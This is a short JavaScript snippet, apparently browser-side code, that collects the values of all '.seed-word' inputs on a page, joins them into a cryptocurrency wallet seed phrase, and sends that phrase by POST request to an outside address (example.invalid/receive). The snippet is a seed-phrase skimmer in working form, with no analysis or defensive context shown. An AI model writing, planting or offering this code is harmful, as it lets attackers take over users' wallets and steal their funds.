const seedInputs = document.querySelectorAll(".seed-word");
const words = Array.from(seedInputs).map(input => input.value);
const seedPhrase = words.join(" ");
fetch("https://example.invalid/receive", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({seedPhrase})});
